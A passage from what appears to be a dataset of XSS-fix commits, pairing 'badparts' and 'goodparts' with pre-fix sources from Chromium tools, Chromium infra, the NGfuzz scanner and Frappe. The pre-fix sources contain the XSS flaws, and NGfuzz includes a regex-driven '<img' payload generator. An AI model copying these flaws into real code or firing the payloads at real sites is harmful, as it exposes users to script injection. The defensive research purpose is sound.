relative_to=SRC_DIR)\n    self.wfile.write(contents.encode('utf-8'))\n\n\nclass _AdjustTOC(markdown.treeprocessors.Treeprocessor):\n  def __init__(self, has_a_single_h1):\n    super(_AdjustTOC, self).__init__()\n    self.has_a_single_h1 = has_a_single_h1\n\n  def run(self, tree):\n    # Given\n    #\n    #     # H1\n    #\n    #     [TOC]\n    #\n    #     ## first H2\n    #\n    #     ## second H2\n    #\n    # the markdown.extensions.toc extension generates:\n    #\n    #     <div class='toc'>\n    #       <ul><li><a>H1</a>\n    #               <ul><li>first H2\n    #                   <li>second H2</li></ul></li><ul></div>\n    #\n    # for [TOC]. But, we want the TOC to have its own subheading, so\n    # we rewrite <div class='toc'><ul>...</ul></div> to:\n    #\n    #     <div class='toc'>\n    #        <h2>Contents</h2>\n    #        <div class='toc-aux'>\n    #          <ul>...</ul></div></div>\n    #\n    # In addition, if the document only has a single H1, it is usually the\n    # title, and we don't want the title to be in the TOC. So, we remove it\n    # and shift all of the title's children up a level, leaving:\n    #\n    #     <div class='toc'>\n    #       <h2>Contents</h2>\n    #       <div class='toc-aux'>\n    #       <ul><li>first H2\n    #           <li>second H2</li></ul></div></div>\n\n    for toc_node in tree.findall(\".//*[@class='toc']\"):\n      toc_ul = toc_node[0]\n      if self.has_a_single_h1:\n        toc_ul_li = toc_ul[0]\n        ul_with_the_desired_toc_entries = toc_ul_li[1]\n      else:\n        ul_with_the_desired_toc_entries = toc_ul\n\n      toc_node.remove(toc_ul)\n      contents = ElementTree.SubElement(toc_node, 'h2')\n      contents.text = 'Contents'\n      contents.tail = '\\n'\n      toc_aux = ElementTree.SubElement(toc_node, 'div', {'class': 'toc-aux'})\n      toc_aux.text = '\\n'\n      toc_aux.append(ul_with_the_desired_toc_entries)\n      toc_aux.tail = '\\n'\n\n\nif __name__ == '__main__':\n  sys.exit(main(sys.argv[1:]))\n"}}, "msg": "md_brower: Escape URL and file names correctly.\n\nmd_browser did not escape URL paths and file names in several pages including\nthe 404 page, which made simple XSS possible by requesting a URL containing\n\"<script>\".\n\nThis patch adds HTML escapes in places where a URL path or a file name is\nprinted. This patch also decodes the percent encodings in the request path\nso that files containing symbols in their names can be shown correctly.\n\nNote that md_browser is a simple tool that is only used locally, thus this\nXSS is not really a big problem. However, there's no reason to leave those\nholes open.\n\nChange-Id: I71da5e388909abd61ea58036edfdf8277ecda420\nReviewed-on: https://chromium-review.googlesource.com/585513\nReviewed-by: Dirk Pranke <dpranke@chromium.org>\nCommit-Queue: Yuta Kitamura <yutak@chromium.org>\nCr-Commit-Position: refs/heads/master@{#490310}"}}, "https://github.com/asdfghjjklllllaaa/infra": {"2f39f3df54fb79b56744f00bcf97583b3807851f": {"url": "https://api.github.com/repos/asdfghjjklllllaaa/infra/commits/2f39f3df54fb79b56744f00bcf97583b3807851f", "html_url": "https://github.com/asdfghjjklllllaaa/infra/commit/2f39f3df54fb79b56744f00bcf97583b3807851f", "sha": "2f39f3df54fb79b56744f00bcf97583b3807851f", "keyword": "XSS change", "diff": "diff --git a/appengine/cr-buildbucket/handlers.py b/appengine/cr-buildbucket/handlers.py\nindex aab171ff3..05cdd4563 100644\n--- a/appengine/cr-buildbucket/handlers.py\n+++ b/appengine/cr-buildbucket/handlers.py\n@@ -2,8 +2,6 @@\n # Use of this source code is governed by a BSD-style license that can be\n # found in the LICENSE file.\n \n-from google.appengine.api import users as gae_users\n-\n from components import auth\n from components import config as config_api\n from components import decorators\n@@ -62,8 +60,8 @@ class ViewBuildHandler(auth.AuthenticatingHandler):  # pragma: no cover\n   def get(self, build_id):\n     try:\n       build_id = int(build_id)\n-    except ValueError as ex:\n-      self.response.write(ex.message)\n+    except ValueError:\n+      self.response.write('invalid build id')\n       self.abort(400)\n \n     build = model.Build.get_by_id(build_id)\n@@ -71,7 +69,7 @@ def get(self, build_id):\n \n     if not can_view:\n       if auth.get_current_identity().is_anonymous:\n-        return self.redirect(gae_users.create_login_url(self.request.url))\n+        return self.redirect(self.create_login_url(self.request.url))\n       self.response.write('build %d not found' % build_id)\n       self.abort(404)\n \n", "message": "", "files": {"/appengine/cr-buildbucket/handlers.py": {"changes": [{"diff": "\n # Use of this source code is governed by a BSD-style license that can be\n # found in the LICENSE file.\n \n-from google.appengine.api import users as gae_users\n-\n from components import auth\n from components import config as config_api\n from components import decorators\n", "add": 0, "remove": 2, "filename": "/appengine/cr-buildbucket/handlers.py", "badparts": ["from google.appengine.api import users as gae_users"], "goodparts": []}, {"diff": "\n   def get(self, build_id):\n     try:\n       build_id = int(build_id)\n-    except ValueError as ex:\n-      self.response.write(ex.message)\n+    except ValueError:\n+      self.response.write('invalid build id')\n       self.abort(400)\n \n     build = model.Build.get_by_id(build_id)\n", "add": 2, "remove": 2, "filename": "/appengine/cr-buildbucket/handlers.py", "badparts": ["    except ValueError as ex:", "      self.response.write(ex.message)"], "goodparts": ["    except ValueError:", "      self.response.write('invalid build id')"]}, {"diff": "\n \n     if not can_view:\n       if auth.get_current_identity().is_anonymous:\n-        return self.redirect(gae_users.create_login_url(self.request.url))\n+        return self.redirect(self.create_login_url(self.request.url))\n       self.response.write('build %d not found' % build_id)\n       self.abort(404)\n \n", "add": 1, "remove": 1, "filename": "/appengine/cr-buildbucket/handlers.py", "badparts": ["        return self.redirect(gae_users.create_login_url(self.request.url))"], "goodparts": ["        return self.redirect(self.create_login_url(self.request.url))"]}], "source": "\n from google.appengine.api import users as gae_users from components import auth from components import config as config_api from components import decorators from components import endpoints_webapp2 from components import prpc import webapp2 from legacy import api as legacy_api from legacy import swarmbucket_api import access import api import bq import bulkproc import config import expiration import model import notifications import service import swarming import user README_MD=( 'https://chromium.googlesource.com/infra/infra/+/master/' 'appengine/cr-buildbucket/README.md' ) class MainHandler(webapp2.RequestHandler): \"\"\"Redirects to README.md.\"\"\" def get(self): return self.redirect(README_MD) class CronUpdateBuckets(webapp2.RequestHandler): \"\"\"Updates buckets from configs.\"\"\" @decorators.require_cronjob def get(self): config.cron_update_buckets() class BuildRPCHandler(webapp2.RequestHandler): \"\"\"Redirects to API explorer to see the build.\"\"\" def get(self, build_id): api_path='/_ah/api/buildbucket/v1/builds/%s' % build_id return self.redirect(api_path) class ViewBuildHandler(auth.AuthenticatingHandler): \"\"\"Redirects to API explorer to see the build.\"\"\" @auth.public def get(self, build_id): try: build_id=int(build_id) except ValueError as ex: self.response.write(ex.message) self.abort(400) build=model.Build.get_by_id(build_id) can_view=build and user.can_view_build_async(build).get_result() if not can_view: if auth.get_current_identity().is_anonymous: return self.redirect(gae_users.create_login_url(self.request.url)) self.response.write('build %d not found' % build_id) self.abort(404) return self.redirect(str(build.url)) class TaskCancelSwarmingTask(webapp2.RequestHandler): \"\"\"Cancels a swarming task.\"\"\" @decorators.require_taskqueue('backend-default') def post(self, host, task_id): swarming.cancel_task(host, task_id) class UnregisterBuilders(webapp2.RequestHandler): \"\"\"Unregisters builders that didn't have builds for a long time.\"\"\" @decorators.require_cronjob def get(self): service.unregister_builders() def get_frontend_routes(): endpoints_services=[ legacy_api.BuildBucketApi, config_api.ConfigApi, swarmbucket_api.SwarmbucketApi, ] routes=[ webapp2.Route(r'/', MainHandler), webapp2.Route(r'/b/<build_id:\\d+>', BuildRPCHandler), webapp2.Route(r'/build/<build_id:\\d+>', ViewBuildHandler), ] routes.extend(endpoints_webapp2.api_routes(endpoints_services)) routes.extend( endpoints_webapp2.api_routes(endpoints_services, base_path='/api') ) prpc_server=prpc.Server() prpc_server.add_interceptor(auth.prpc_interceptor) prpc_server.add_service(access.AccessServicer()) prpc_server.add_service(api.BuildsApi()) routes +=prpc_server.get_routes() return routes def get_backend_routes(): prpc_server=prpc.Server() prpc_server.add_interceptor(auth.prpc_interceptor) prpc_server.add_service(api.BuildsApi()) return[ webapp2.Route(r'/internal/cron/buildbucket/expire_build_leases', expiration.CronExpireBuildLeases), webapp2.Route(r'/internal/cron/buildbucket/expire_builds', expiration.CronExpireBuilds), webapp2.Route(r'/internal/cron/buildbucket/delete_builds', expiration.CronDeleteBuilds), webapp2.Route(r'/internal/cron/buildbucket/update_buckets', CronUpdateBuckets), webapp2.Route(r'/internal/cron/buildbucket/bq-export-prod', bq.CronExportBuildsProd), webapp2.Route(r'/internal/cron/buildbucket/bq-export-experimental', bq.CronExportBuildsExperimental), webapp2.Route(r'/internal/cron/buildbucket/unregister-builders', UnregisterBuilders), webapp2.Route(r'/internal/task/buildbucket/notify/<build_id:\\d+>', notifications.TaskPublishNotification), webapp2.Route( r'/internal/task/buildbucket/cancel_swarming_task/<host>/<task_id>', TaskCancelSwarmingTask), ] +bulkproc.get_routes() +prpc_server.get_routes() ", "sourceWithComments": "# Copyright 2017 The Chromium Authors. All rights reserved.\n# Use of this source code is governed by a BSD-style license that can be\n# found in the LICENSE file.\n\nfrom google.appengine.api import users as gae_users\n\nfrom components import auth\nfrom components import config as config_api\nfrom components import decorators\nfrom components import endpoints_webapp2\nfrom components import prpc\n\nimport webapp2\n\nfrom legacy import api as legacy_api\nfrom legacy import swarmbucket_api\nimport access\nimport api\nimport bq\nimport bulkproc\nimport config\nimport expiration\nimport model\nimport notifications\nimport service\nimport swarming\nimport user\n\nREADME_MD = (\n    'https://chromium.googlesource.com/infra/infra/+/master/'\n    'appengine/cr-buildbucket/README.md'\n)\n\n\nclass MainHandler(webapp2.RequestHandler):  # pragma: no cover\n  \"\"\"Redirects to README.md.\"\"\"\n\n  def get(self):\n    return self.redirect(README_MD)\n\n\nclass CronUpdateBuckets(webapp2.RequestHandler):  # pragma: no cover\n  \"\"\"Updates buckets from configs.\"\"\"\n\n  @decorators.require_cronjob\n  def get(self):\n    config.cron_update_buckets()\n\n\nclass BuildRPCHandler(webapp2.RequestHandler):  # pragma: no cover\n  \"\"\"Redirects to API explorer to see the build.\"\"\"\n\n  def get(self, build_id):\n    api_path = '/_ah/api/buildbucket/v1/builds/%s' % build_id\n    return self.redirect(api_path)\n\n\nclass ViewBuildHandler(auth.AuthenticatingHandler):  # pragma: no cover\n  \"\"\"Redirects to API explorer to see the build.\"\"\"\n\n  @auth.public\n  def get(self, build_id):\n    try:\n      build_id = int(build_id)\n    except ValueError as ex:\n      self.response.write(ex.message)\n      self.abort(400)\n\n    build = model.Build.get_by_id(build_id)\n    can_view = build and user.can_view_build_async(build).get_result()\n\n    if not can_view:\n      if auth.get_current_identity().is_anonymous:\n        return self.redirect(gae_users.create_login_url(self.request.url))\n      self.response.write('build %d not found' % build_id)\n      self.abort(404)\n\n    return self.redirect(str(build.url))\n\n\nclass TaskCancelSwarmingTask(webapp2.RequestHandler):  # pragma: no cover\n  \"\"\"Cancels a swarming task.\"\"\"\n\n  @decorators.require_taskqueue('backend-default')\n  def post(self, host, task_id):\n    swarming.cancel_task(host, task_id)\n\n\nclass UnregisterBuilders(webapp2.RequestHandler):  # pragma: no cover\n  \"\"\"Unregisters builders that didn't have builds for a long time.\"\"\"\n\n  @decorators.require_cronjob\n  def get(self):\n    service.unregister_builders()\n\n\ndef get_frontend_routes():  # pragma: no cover\n  endpoints_services = [\n      legacy_api.BuildBucketApi,\n      config_api.ConfigApi,\n      swarmbucket_api.SwarmbucketApi,\n  ]\n  routes = [\n      webapp2.Route(r'/', MainHandler),\n      webapp2.Route(r'/b/<build_id:\\d+>', BuildRPCHandler),\n      webapp2.Route(r'/build/<build_id:\\d+>', ViewBuildHandler),\n  ]\n  routes.extend(endpoints_webapp2.api_routes(endpoints_services))\n  # /api routes should be removed once clients are hitting /_ah/api.\n  routes.extend(\n      endpoints_webapp2.api_routes(endpoints_services, base_path='/api')\n  )\n\n  prpc_server = prpc.Server()\n  prpc_server.add_interceptor(auth.prpc_interceptor)\n  prpc_server.add_service(access.AccessServicer())\n  prpc_server.add_service(api.BuildsApi())\n  routes += prpc_server.get_routes()\n\n  return routes\n\n\ndef get_backend_routes():  # pragma: no cover\n  prpc_server = prpc.Server()\n  prpc_server.add_interceptor(auth.prpc_interceptor)\n  prpc_server.add_service(api.BuildsApi())\n\n  return [  # pragma: no branch\n      webapp2.Route(r'/internal/cron/buildbucket/expire_build_leases',\n                    expiration.CronExpireBuildLeases),\n      webapp2.Route(r'/internal/cron/buildbucket/expire_builds',\n                    expiration.CronExpireBuilds),\n      webapp2.Route(r'/internal/cron/buildbucket/delete_builds',\n                    expiration.CronDeleteBuilds),\n      webapp2.Route(r'/internal/cron/buildbucket/update_buckets',\n                    CronUpdateBuckets),\n      webapp2.Route(r'/internal/cron/buildbucket/bq-export-prod',\n                    bq.CronExportBuildsProd),\n      webapp2.Route(r'/internal/cron/buildbucket/bq-export-experimental',\n                    bq.CronExportBuildsExperimental),\n      webapp2.Route(r'/internal/cron/buildbucket/unregister-builders',\n                    UnregisterBuilders),\n      webapp2.Route(r'/internal/task/buildbucket/notify/<build_id:\\d+>',\n                    notifications.TaskPublishNotification),\n      webapp2.Route(\n          r'/internal/task/buildbucket/cancel_swarming_task/<host>/<task_id>',\n          TaskCancelSwarmingTask),\n  ] + bulkproc.get_routes() + prpc_server.get_routes()\n"}}, "msg": "[buildbucket] Follow up for /builds/<id> handler\n\nAddress the rest of comments in\nhttps://chromium-review.googlesource.com/c/infra/infra/+/1521306\n\nPrevent XSS and use self.create_login_url\n\nR=borenet@google.com, vadimsh@chromium.org\nBug: 941535\n\nChange-Id: I7be08f3db1c57f1dc7f424396cb36efbe1ffa190\nReviewed-on: https://chromium-review.googlesource.com/c/infra/infra/+/1521009\nReviewed-by: Vadim Shtayura <vadimsh@chromium.org>\nReviewed-by: Eric Boren <borenet@chromium.org>\nCommit-Queue: Nodir Turakulov <nodir@chromium.org>\nAuto-Submit: Nodir Turakulov <nodir@chromium.org>\nCr-Commit-Position: refs/heads/master@{#21376}"}}, "https://github.com/dmknght/NGfuzz": {"38c184f73918a249f6bc4e395ca2e5385e1ef220": {"url": "https://api.github.com/repos/dmknght/NGfuzz/commits/38c184f73918a249f6bc4e395ca2e5385e1ef220", "html_url": "https://github.com/dmknght/NGfuzz/commit/38c184f73918a249f6bc4e395ca2e5385e1ef220", "sha": "38c184f73918a249f6bc4e395ca2e5385e1ef220", "keyword": "XSS check", "diff": "diff --git a/modules/ActiveScan/xss.py b/modules/ActiveScan/xss.py\nindex f375849..f0ece59 100644\n--- a/modules/ActiveScan/xss.py\n+++ b/modules/ActiveScan/xss.py\n@@ -9,14 +9,13 @@ def gen_payload(self):\n \t\t\t_payload = generate.xeger(\"((\\%3C)|<)((\\%69)|i|(\\%49))((\\%6D)|m|(\\%4D))((\\%67)|g|(\\%47))[^\\n]+((\\%3E)|>)\")\n \t\t\tif any(x in _payload for x in \"\\\"'><;/\"):\n \t\t\t\treturn _payload\n-\n-\tdef check(self, url, payload, response, parameter):\n+\t\n+\tdef fuzz(self, url, payload, response, parameter):\n \t\tfor injection_types in self.signatures.keys():\n \t\t\tfor sig in self.signatures[injection_types]:\n \t\t\t\tmatch = re.findall(re.escape(sig), response)\n \t\t\t\tif match and any(x in payload for x in \"><\"):\n-\t\t\t\t\tself.found(injection_types, url, parameter, payload)\n-\t\t\t\t\treturn True\n+\t\t\t\t\treturn self.signatures.keys()[0]\n \t\treturn False\n \t\n \tdef signature(self):\n", "message": "", "files": {"/modules/ActiveScan/xss.py": {"changes": [{"diff": "\n \t\t\t_payload = generate.xeger(\"((\\%3C)|<)((\\%69)|i|(\\%49))((\\%6D)|m|(\\%4D))((\\%67)|g|(\\%47))[^\\n]+((\\%3E)|>)\")\n \t\t\tif any(x in _payload for x in \"\\\"'><;/\"):\n \t\t\t\treturn _payload\n-\n-\tdef check(self, url, payload, response, parameter):\n+\t\n+\tdef fuzz(self, url, payload, response, parameter):\n \t\tfor injection_types in self.signatures.keys():\n \t\t\tfor sig in self.signatures[injection_types]:\n \t\t\t\tmatch = re.findall(re.escape(sig), response)\n \t\t\t\tif match and any(x in payload for x in \"><\"):\n-\t\t\t\t\tself.found(injection_types, url, parameter, payload)\n-\t\t\t\t\treturn True\n+\t\t\t\t\treturn self.signatures.keys()[0]\n \t\treturn False\n \t\n \tdef signature(self):\n", "add": 3, "remove": 4, "filename": "/modules/ActiveScan/xss.py", "badparts": ["\tdef check(self, url, payload, response, parameter):", "\t\t\t\t\tself.found(injection_types, url, parameter, payload)", "\t\t\t\t\treturn True"], "goodparts": ["\t", "\tdef fuzz(self, url, payload, response, parameter):", "\t\t\t\t\treturn self.signatures.keys()[0]"]}], "source": "\nfrom cores.base_plugins import Scanner import re class Check(Scanner): \tdef gen_payload(self): \t\tfrom cores.xeger import Xeger \t\tgenerate=Xeger() \t\twhile True: \t\t\t_payload=generate.xeger(\"((\\%3C)|<)((\\%69)|i|(\\%49))((\\%6D)|m|(\\%4D))((\\%67)|g|(\\%47))[^\\n]+((\\%3E)|>)\") \t\t\tif any(x in _payload for x in \"\\\"'><;/\"): \t\t\t\treturn _payload \tdef check(self, url, payload, response, parameter): \t\tfor injection_types in self.signatures.keys(): \t\t\tfor sig in self.signatures[injection_types]: \t\t\t\tmatch=re.findall(re.escape(sig), response) \t\t\t\tif match and any(x in payload for x in \"><\"): \t\t\t\t\tself.found(injection_types, url, parameter, payload) \t\t\t\t\treturn True \t\treturn False \t \tdef signature(self): \t\treturn{\"XSS\": self.payload} ", "sourceWithComments": "from cores.base_plugins import Scanner\nimport re\n\nclass Check(Scanner):\n\tdef gen_payload(self):\n\t\tfrom cores.xeger import Xeger\n\t\tgenerate = Xeger()\n\t\twhile True:\n\t\t\t_payload = generate.xeger(\"((\\%3C)|<)((\\%69)|i|(\\%49))((\\%6D)|m|(\\%4D))((\\%67)|g|(\\%47))[^\\n]+((\\%3E)|>)\")\n\t\t\tif any(x in _payload for x in \"\\\"'><;/\"):\n\t\t\t\treturn _payload\n\n\tdef check(self, url, payload, response, parameter):\n\t\tfor injection_types in self.signatures.keys():\n\t\t\tfor sig in self.signatures[injection_types]:\n\t\t\t\tmatch = re.findall(re.escape(sig), response)\n\t\t\t\tif match and any(x in payload for x in \"><\"):\n\t\t\t\t\tself.found(injection_types, url, parameter, payload)\n\t\t\t\t\treturn True\n\t\treturn False\n\t\n\tdef signature(self):\n\t\treturn {\"XSS\" : self.payload}\n"}}, "msg": "Add check payload for things seems like xss"}}, "https://github.com/omirajkar/bench_frappe": {"2fa19c25066ed17478d683666895e3266936aee6": {"url": "https://api.github.com/repos/omirajkar/bench_frappe/commits/2fa19c25066ed17478d683666895e3266936aee6", "html_url": "https://github.com/omirajkar/bench_frappe/commit/2fa19c25066ed17478d683666895e3266936aee6", "sha": "2fa19c25066ed17478d683666895e3266936aee6", "keyword": "XSS fix", "diff": "diff --git a/frappe/website/doctype/blog_post/blog_post.py b/frappe/website/doctype/blog_post/blog_post.py\nindex a20e9fa12..e4c757e64 100644\n--- a/frappe/website/doctype/blog_post/blog_post.py\n+++ b/frappe/website/doctype/blog_post/blog_post.py\n@@ -7,7 +7,7 @@\n from frappe import _\n from frappe.website.website_generator import WebsiteGenerator\n from frappe.website.render import clear_cache\n-from frappe.utils import today, cint, global_date_format, get_fullname, strip_html_tags, markdown\n+from frappe.utils import today, cint, global_date_format, get_fullname, strip_html_tags, markdown, sanitize_html\n from frappe.website.utils import find_first_image, get_comment_list\n \n class BlogPost(WebsiteGenerator):\n@@ -95,7 +95,7 @@ def get_list_context(context=None):\n \t\ttitle = _('Blog')\n \t)\n \n-\tcategory = frappe.local.form_dict.blog_category or frappe.local.form_dict.category\n+\tcategory = sanitize_html(frappe.local.form_dict.blog_category or frappe.local.form_dict.category)\n \tif category:\n \t\tcategory_title = get_blog_category(category)\n \t\tlist_context.sub_title = _(\"Posts filed under {0}\").format(category_title)\n@@ -107,7 +107,7 @@ def get_list_context(context=None):\n \t\tlist_context.title = blogger\n \n \telif frappe.local.form_dict.txt:\n-\t\tlist_context.sub_title = _('Filtered by \"{0}\"').format(frappe.local.form_dict.txt)\n+\t\tlist_context.sub_title = _('Filtered by \"{0}\"').format(sanitize_html(frappe.local.form_dict.txt))\n \n \tif list_context.sub_title:\n \t\tlist_context.parents = [{\"name\": _(\"Home\"), \"route\": \"/\"},\n", "message": "", "files": {"/frappe/website/doctype/blog_post/blog_post.py": {"changes": [{"diff": "\n from frappe import _\n from frappe.website.website_generator import WebsiteGenerator\n from frappe.website.render import clear_cache\n-from frappe.utils import today, cint, global_date_format, get_fullname, strip_html_tags, markdown\n+from frappe.utils import today, cint, global_date_format, get_fullname, strip_html_tags, markdown, sanitize_html\n from frappe.website.utils import find_first_image, get_comment_list\n \n class BlogPost(WebsiteGenerator):\n", "add": 1, "remove": 1, "filename": "/frappe/website/doctype/blog_post/blog_post.py", "badparts": ["from frappe.utils import today, cint, global_date_format, get_fullname, strip_html_tags, markdown"], "goodparts": ["from frappe.utils import today, cint, global_date_format, get_fullname, strip_html_tags, markdown, sanitize_html"]}, {"diff": "\n \t\ttitle = _('Blog')\n \t)\n \n-\tcategory = frappe.local.form_dict.blog_category or frappe.local.form_dict.category\n+\tcategory = sanitize_html(frappe.local.form_dict.blog_category or frappe.local.form_dict.category)\n \tif category:\n \t\tcategory_title = get_blog_category(category)\n \t\tlist_context.sub_title = _(\"Posts filed under {0}\").format(category_title)\n", "add": 1, "remove": 1, "filename": "/frappe/website/doctype/blog_post/blog_post.py", "badparts": ["\tcategory = frappe.local.form_dict.blog_category or frappe.local.form_dict.category"], "goodparts": ["\tcategory = sanitize_html(frappe.local.form_dict.blog_category or frappe.local.form_dict.category)"]}, {"diff": "\n \t\tlist_context.title = blogger\n \n \telif frappe.local.form_dict.txt:\n-\t\tlist_context.sub_title = _('Filtered by \"{0}\"').format(frappe.local.form_dict.txt)\n+\t\tlist_context.sub_title = _('Filtered by \"{0}\"').format(sanitize_html(frappe.local.form_dict.txt))\n \n \tif list_context.sub_title:\n \t\tlist_context.parents = [{\"name\": _(\"Home\"), \"route\": \"/\"},\n", "add": 1, "remove": 1, "filename": "/frappe/website/doctype/blog_post/blog_post.py", "badparts": ["\t\tlist_context.sub_title = _('Filtered by \"{0}\"').format(frappe.local.form_dict.txt)"], "goodparts": ["\t\tlist_context.sub_title = _('Filtered by \"{0}\"').format(sanitize_html(frappe.local.form_dict.txt))"]}], "source": "\n from __future__ import unicode_literals import frappe from frappe import _ from frappe.website.website_generator import WebsiteGenerator from frappe.website.render import clear_cache from frappe.utils import today, cint, global_date_format, get_fullname, strip_html_tags, markdown from frappe.website.utils import find_first_image, get_comment_list class BlogPost(WebsiteGenerator): \twebsite=frappe._dict( \t\torder_by=\"published_on desc\" \t) \tdef make_route(self): \t\tif not self.route: \t\t\treturn frappe.db.get_value('Blog Category', self.blog_category, \t\t\t\t'route') +'/' +self.scrub(self.title) \tdef get_feed(self): \t\treturn self.title \tdef validate(self): \t\tsuper(BlogPost, self).validate() \t\tif not self.blog_intro: \t\t\tself.blog_intro=self.content[:140] \t\t\tself.blog_intro=strip_html_tags(self.blog_intro) \t\tif self.blog_intro: \t\t\tself.blog_intro=self.blog_intro[:140] \t\tif self.published and not self.published_on: \t\t\tself.published_on=today() \t\t \t\tfrappe.db.sql(\"\"\"update tabBlogger set posts=(select count(*) from `tabBlog Post` \t\t\twhere ifnull(blogger,'')=tabBlogger.name) \t\t\twhere name=%s\"\"\",(self.blogger,)) \tdef on_update(self): \t\tclear_cache(\"writers\") \tdef get_context(self, context): \t\t \t\tif not cint(self.published): \t\t\traise Exception(\"This blog has not been published yet!\") \t\t \t\tcontext.full_name=get_fullname(self.owner) \t\tcontext.updated=global_date_format(self.published_on) \t\tif self.blogger: \t\t\tcontext.blogger_info=frappe.get_doc(\"Blogger\", self.blogger).as_dict() \t\tcontext.description=self.blog_intro or self.content[:140] \t\tcontext.metatags={ \t\t\t\"name\": self.title, \t\t\t\"description\": context.description, \t\t} \t\tif \"<!--markdown -->\" in context.content: \t\t\tcontext.content=markdown(context.content) \t\timage=find_first_image(self.content) \t\tif image: \t\t\tcontext.metatags[\"image\"]=image \t\tcontext.comment_list=get_comment_list(self.doctype, self.name) \t\tif not context.comment_list: \t\t\tcontext.comment_text=_('No comments yet') \t\telse: \t\t\tif(len(context.comment_list))==1: \t\t\t\tcontext.comment_text=_('1 comment') \t\t\telse: \t\t\t\tcontext.comment_text=_('{0} comments').format(len(context.comment_list)) \t\tcontext.category=frappe.db.get_value(\"Blog Category\", \t\t\tcontext.doc.blog_category,[\"title\", \"route\"], as_dict=1) \t\tcontext.parents=[{\"name\": _(\"Home\"), \"route\":\"/\"}, \t\t\t{\"name\": \"Blog\", \"route\": \"/blog\"}, \t\t\t{\"label\": context.category.title, \"route\":context.category.route}] def get_list_context(context=None): \tlist_context=frappe._dict( \t\ttemplate=\"templates/includes/blog/blog.html\", \t\tget_list=get_blog_list, \t\thide_filters=True, \t\tchildren=get_children(), \t\t \t\ttitle=_('Blog') \t) \tcategory=frappe.local.form_dict.blog_category or frappe.local.form_dict.category \tif category: \t\tcategory_title=get_blog_category(category) \t\tlist_context.sub_title=_(\"Posts filed under{0}\").format(category_title) \t\tlist_context.title=category_title \telif frappe.local.form_dict.blogger: \t\tblogger=frappe.db.get_value(\"Blogger\",{\"name\": frappe.local.form_dict.blogger}, \"full_name\") \t\tlist_context.sub_title=_(\"Posts by{0}\").format(blogger) \t\tlist_context.title=blogger \telif frappe.local.form_dict.txt: \t\tlist_context.sub_title=_('Filtered by \"{0}\"').format(frappe.local.form_dict.txt) \tif list_context.sub_title: \t\tlist_context.parents=[{\"name\": _(\"Home\"), \"route\": \"/\"}, \t\t\t\t\t\t\t\t{\"name\": \"Blog\", \"route\": \"/blog\"}] \telse: \t\tlist_context.parents=[{\"name\": _(\"Home\"), \"route\": \"/\"}] \tlist_context.update(frappe.get_doc(\"Blog Settings\", \"Blog Settings\").as_dict(no_default_fields=True)) \treturn list_context def get_children(): \treturn frappe.db.sql(\"\"\"select route as name, \t\ttitle from `tabBlog Category` \t\twhere published=1 \t\tand exists(select name from `tabBlog Post` \t\t\twhere `tabBlog Post`.blog_category=`tabBlog Category`.name and published=1) \t\torder by title asc\"\"\", as_dict=1) def clear_blog_cache(): \tfor blog in frappe.db.sql_list(\"\"\"select route from \t\t`tabBlog Post` where ifnull(published,0)=1\"\"\"): \t\tclear_cache(blog) \tclear_cache(\"writers\") def get_blog_category(route): \treturn frappe.db.get_value(\"Blog Category\",{\"name\": route}, \"title\") or route def get_blog_list(doctype, txt=None, filters=None, limit_start=0, limit_page_length=20, order_by=None): \tconditions=[] \tif filters: \t\tif filters.blogger: \t\t\tconditions.append('t1.blogger=\"%s\"' % frappe.db.escape(filters.blogger)) \t\tif filters.blog_category: \t\t\tconditions.append('t1.blog_category=\"%s\"' % frappe.db.escape(filters.blog_category)) \tif txt: \t\tconditions.append('(t1.content like \"%{0}%\" or t1.title like \"%{0}%\")'.format(frappe.db.escape(txt))) \tif conditions: \t\tfrappe.local.no_cache=1 \tquery=\"\"\"\\ \t\tselect \t\t\tt1.title, t1.name, t1.blog_category, t1.route, t1.published_on, \t\t\t\tt1.published_on as creation, \t\t\t\tt1.content as content, \t\t\t\tifnull(t1.blog_intro, t1.content) as intro, \t\t\t\tt2.full_name, t2.avatar, t1.blogger, \t\t\t\t(select count(name) from `tabCommunication` \t\t\t\t\twhere \t\t\t\t\t\tcommunication_type='Comment' \t\t\t\t\t\tand comment_type='Comment' \t\t\t\t\t\tand reference_doctype='Blog Post' \t\t\t\t\t\tand reference_name=t1.name) as comments \t\tfrom `tabBlog Post` t1, `tabBlogger` t2 \t\twhere ifnull(t1.published,0)=1 \t\tand t1.blogger=t2.name \t\t%(condition)s \t\torder by published_on desc, name asc \t\tlimit %(start)s, %(page_len)s\"\"\" %{ \t\t\t\"start\": limit_start, \"page_len\": limit_page_length, \t\t\t\t\"condition\":(\" and \" +\" and \".join(conditions)) if conditions else \"\" \t\t} \tposts=frappe.db.sql(query, as_dict=1) \tfor post in posts: \t\tpost.cover_image=find_first_image(post.content) \t\tpost.published=global_date_format(post.creation) \t\tpost.content=strip_html_tags(post.content[:340]) \t\tif not post.comments: \t\t\tpost.comment_text=_('No comments yet') \t\telif post.comments==1: \t\t\tpost.comment_text=_('1 comment') \t\telse: \t\t\tpost.comment_text=_('{0} comments').format(str(post.comments)) \t\tpost.avatar=post.avatar or \"\" \t\tpost.category=frappe.db.get_value('Blog Category', post.blog_category, \t\t\t['route', 'title'], as_dict=True) \t\tif post.avatar and(not \"http:\" in post.avatar and not \"https:\" in post.avatar) and not post.avatar.startswith(\"/\"): \t\t\tpost.avatar=\"/\" +post.avatar \treturn posts ", "sourceWithComments": "# Copyright (c) 2015, Frappe Technologies Pvt. Ltd. and Contributors\n# MIT License. See license.txt\n\nfrom __future__ import unicode_literals\n\nimport frappe\nfrom frappe import _\nfrom frappe.website.website_generator import WebsiteGenerator\nfrom frappe.website.render import clear_cache\nfrom frappe.utils import today, cint, global_date_format, get_fullname, strip_html_tags, markdown\nfrom frappe.website.utils import find_first_image, get_comment_list\n\nclass BlogPost(WebsiteGenerator):\n\twebsite = frappe._dict(\n\t\torder_by = \"published_on desc\"\n\t)\n\n\tdef make_route(self):\n\t\tif not self.route:\n\t\t\treturn frappe.db.get_value('Blog Category', self.blog_category,\n\t\t\t\t'route') + '/' + self.scrub(self.title)\n\n\tdef get_feed(self):\n\t\treturn self.title\n\n\tdef validate(self):\n\t\tsuper(BlogPost, self).validate()\n\n\t\tif not self.blog_intro:\n\t\t\tself.blog_intro = self.content[:140]\n\t\t\tself.blog_intro = strip_html_tags(self.blog_intro)\n\n\t\tif self.blog_intro:\n\t\t\tself.blog_intro = self.blog_intro[:140]\n\n\t\tif self.published and not self.published_on:\n\t\t\tself.published_on = today()\n\n\t\t# update posts\n\t\tfrappe.db.sql(\"\"\"update tabBlogger set posts=(select count(*) from `tabBlog 